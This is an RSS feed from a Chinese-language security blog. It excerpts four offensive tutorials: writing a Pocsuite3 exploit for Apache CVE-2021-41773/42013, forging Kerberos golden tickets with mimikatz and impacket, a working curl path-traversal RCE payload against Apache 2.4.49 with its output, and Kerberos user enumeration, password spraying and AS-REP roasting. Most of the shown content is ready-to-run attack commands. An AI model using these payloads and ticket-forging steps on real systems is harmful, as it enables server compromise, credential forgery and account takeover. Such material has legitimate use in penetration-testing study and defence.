<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>Posts on Oulaa</title>
    <link>/posts/</link>
    <description>Recent content in Posts on Oulaa</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>en</language>
    <copyright>&amp;copy; 2021 &lt;a href=&#34;https://www.wangchucheng.com/&#34;&gt;C. Wang&lt;/a&gt; and &lt;a href=&#34;https://www.ruiqima.com/&#34;&gt;R. Ma&lt;/a&gt;
</copyright>
    <lastBuildDate>Mon, 11 Oct 2021 00:00:00 +0000</lastBuildDate><atom:link href="/posts/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>Pocsuite3 POC/EXP编写</title>
      <link>/posts/pocsuite3-%E4%BD%BF%E7%94%A8%E4%BB%A5%E5%8F%8Apoc%E7%BC%96%E5%86%99/</link>
      <pubDate>Mon, 11 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>/posts/pocsuite3-%E4%BD%BF%E7%94%A8%E4%BB%A5%E5%8F%8Apoc%E7%BC%96%E5%86%99/</guid>
      <description>Pocsuite3 是一个POC框架，用于漏洞的验证、攻击等等
使用 https://github.com/knownsec/pocsuite3/blob/master/docs/USAGE.md
Pocsuite3可以进行批量验证、攻击，它有三种模式verify（验证）、attack（攻击）、shell（获得shell），并且可以设置多种参数。
编写POC 这里以CVE-2021-41773、CVE-2021-42013为例尝试使用Pocsuite3编写PoC与EXP：
思路：
分为linux与windows：
 linux  发送post包检测是否可以RCE
如果不可以的话发送get包检测是否可以目录穿越
读取对象:/etc/passwd
关键字：root
 windows  由于windows的apache无法直接调用cmd执行命令，只能通过php.exe之类的来解析，所以不考虑RCE，只判断是否可以目录穿越读取文件。
读取对象：c:/Windows/win.ini
关键字：extensions
由于两个RCE仅仅是URL编码的不同，所以这里直接使用二次URL编码来兼容两个RCE。
 注意：python的request请求包会自动进行一次编码，所以编写poc的时候不需要二次编码
使用%2e即可
实验发现不行，它会在编码之前先解码一次，解码之后会将..删除，所以换了urllib库。
 导入包 编写 PoC 实现类 DemoPOC，继承自 PoCBase 类
1 2 3 4 5 6 7 8  from pocsuite3.api import Output, POCBase, register_poc, requests, logger from pocsuite3.api import get_listener_ip, get_listener_port from pocsuite3.api import REVERSE_PAYLOAD from pocsuite3.lib.utils import random_str class DemoPOC(POCBase): ...   PoC信息字段填写 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19  vulID = &amp;#39;0&amp;#39; # ssvid ID 如果是提交漏洞的同时提交 PoC，则写成 0 version = &amp;#39;1.</description>
    </item>
    
    <item>
      <title>域中票据的制作</title>
      <link>/posts/%E5%9F%9F%E4%B8%AD%E7%A5%A8%E6%8D%AE%E7%9A%84%E5%88%B6%E4%BD%9C/</link>
      <pubDate>Mon, 11 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>/posts/%E5%9F%9F%E4%B8%AD%E7%A5%A8%E6%8D%AE%E7%9A%84%E5%88%B6%E4%BD%9C/</guid>
      <description>一、使用mimikatz制作票据 1  kerberos::purge   1  kerberos::golden /user:administrator /domain:unicode.org /sid:S-1-5-21-165017151-3123059220-25911706310 /krbtgt:xxx /ticket:admin.tck /ptt   注入票据
1  kerberos::tgt admin.tck    注意：拿到票据之后注入内存，使用sc之类的服务的情况下使用主机名即可走域认证，使用IP走ntlm认证。
 清除票据
1  klist /purge   二、impakect  （1）金票  制作票据：
1  python3 ticketer.py -nthash 1caee7a5d22ec1b4a20d1c6d72cdfbf1 -domain-sid S-1-5-21-3428754558-1783579842-1599308265 -domain central.com.br administrator    -nthash为krbgtg的hash。
-domain-sid为域SID，即域用户ID减去用户部分。
 设置临时环境变量(windows)：
1  set KRB5CCNAME=C:\Users\aa\Desktop\剑客\内网渗透\impacket-master\impacket-master\examples   linux:
1  export KRB5CCNAME=/pentest/impacket/examples/administrator.ccache   使用黄金票据去访问DC
1  python3 wmiexec.py -k -no-pass -dc-ip 192.</description>
    </item>
    
    <item>
      <title>CVE-2021-41773 Apache HTTPd (2.4.49)</title>
      <link>/posts/41773/</link>
      <pubDate>Sun, 10 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>/posts/41773/</guid>
      <description>一、 复现环境 https://github.com/blasty/CVE-2021-41773
1  docker-compose build &amp;amp;&amp;amp; docker-compose up -d   二、目录穿越  不能在浏览器复现，会被自动去掉..
 三、RCE 前提：
安装Apache之后，默认并不包含cgi 模块，需要我们自行安装以完成cgi解析，那么有没有可能在启用mod_cgi模块的前提下，实现RCE呢？
所以前提是启用mod_cgid和mod_cgi模块。
Linux上的apache实现回显RCE： 在linux上直接可以：
1 2  curl -s --path-as-is -d &amp;#39;echo Content-Type: text/plain; echo; id&amp;#39; &amp;#34;http://localhost:8080/cgi-bin/.%2e/%2e%2e/%2e%2e/bin/sh&amp;#34; uid=33(www-data) gid=33(www-data) groups=33(www-data)   使用burp：
1  echo Content-Type: text/plain;echo;id   原理：
直接执行命令无回显的且报500：
原因是ap_scan_script_header_err_core_ex函数主要负责从cgi处理结果中读取输入，并确保输出格式符合一定要求。大体来说就是解析后的结果必须符合http协议规范，我们知道http请求分为header和body，且中间需要使用\r\n进行分割。
也就是说，apache将cgi解析结果作为了http响应包的一部分。
所以才有了如上构造的payload。
windows上的RCE Windows版本的Apache通过目录穿越来读取cmd.exe，会提示mallformed header from script，无法实现命令执行。
但是利用相应的cgi模块可以实现代码执行。
参考资料 https://mp.weixin.qq.com/s/mx7_wTnU7IWxzeG7e6faTQ
https://mp.weixin.qq.com/s?__biz=Mzg3MTU0MjkwNw==&amp;amp;mid=2247484889&amp;amp;idx=1&amp;amp;sn=3b3312b592554caa51e1cfcbacd832f0&amp;amp;chksm=cefdbccdf98a35dbf3ab94bb4fa60b63f6e6afd92224744cd496cd59658bee29e6e89cc801de&amp;amp;token=495462423&amp;amp;lang=zh_CN&amp;amp;scene=21#wechat_redirect</description>
    </item>
    
    <item>
      <title>Kerbrute域内用户枚举与密码喷洒</title>
      <link>/posts/kerbrute%E5%9F%9F%E5%86%85%E7%94%A8%E6%88%B7%E6%9E%9A%E4%B8%BE%E4%B8%8E%E5%AF%86%E7%A0%81%E5%96%B7%E6%B4%92/</link>
      <pubDate>Sun, 10 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>/posts/kerbrute%E5%9F%9F%E5%86%85%E7%94%A8%E6%88%B7%E6%9E%9A%E4%B8%BE%E4%B8%8E%E5%AF%86%E7%A0%81%E5%96%B7%E6%B4%92/</guid>
      <description>根据 &amp;ldquo;kerberos篇&amp;rdquo;的第一步AS_REQ，其发送了用户名，在第二步的校验包AS_REP中由于用户存在、用户不存在与密码错误返回的包不一样，所以可以用来枚举用户名。
 用户名不存在：error-code: eRR-C-PRINCIPAL-UNKNOWN (6)
密码错误：error-code: eRR-PREAUTH-REQUIRED (25) KDC_ERR_PREAUTH_FAILED(24) udp/tcp
 工具：
https://github.com/3gstudent/pyKerbrute
https://3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-%E9%80%9A%E8%BF%87Kerberos-pre-auth%E8%BF%9B%E8%A1%8C%E7%94%A8%E6%88%B7%E6%9E%9A%E4%B8%BE%E5%92%8C%E5%8F%A3%E4%BB%A4%E7%88%86%E7%A0%B4
1. 用户名枚举： 1 2 3 4  EnumADUser.py &amp;lt;domainControlerAddr&amp;gt; &amp;lt;domainName&amp;gt; &amp;lt;mode&amp;gt; &amp;lt;mode&amp;gt;: tcp or udp Eg. EnumADUser.py 192.168.1.1 test.com user.txt tcp   2. 密码喷洒 由于域内策略，连续密码猜测会导致帐户被锁定，爆破的时候一般采用喷洒式的攻击，即密码一样，跑不同的用户名。 关于口令次数限制，默认为 5 次，具体设置在
\\&amp;lt;DOMAIN&amp;gt;\SYSVOL\&amp;lt;DOMAIN&amp;gt;\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Microsoft\Windows NT\SecEdit\GptTmpl.inf中
（1）DomainPasswordSpray  用 PowerShell 编写的工具，用于对域用户执行密码喷洒攻击。默认情况下，它将利用 LDAP 从域中导出用户列表，然后扣掉被锁定的用户，再用固定密码进行密码喷洒。
  缺点是不能在域外使用。
 https://github.com/dafthack/DomainPasswordSpray/blob/master/DomainPasswordSpray.ps1
（2）DomainPasswordSprayOutsideTheDomain https://github.com/3gstudent/Homework-of-Powershell/blob/master/Invoke-DomainPasswordSprayOutsideTheDomain.ps1
可在域外使用
3.SPN爆破
KRB_AS_REP Roasting
(知道即可) 对于域用户，如果设置了选项 &amp;ldquo;Do not require Kerberos preauthentication&amp;rdquo;，此时向域控制器的88端口发送AS_REQ请求，对收到的AS_REP内容(enc-part底下的ciper，因为这部分是使用用户hash加密session-key，我们通过进行离线爆破就可以获得用户hash)重新组合，能够拼接成”Kerberos 5 AS-REP etype 23”(18200)的格式，接下来可以使用hashcat对其破解，最终获得该用户的明文口令</description>
    </item>
    
  </channel>
</rss>
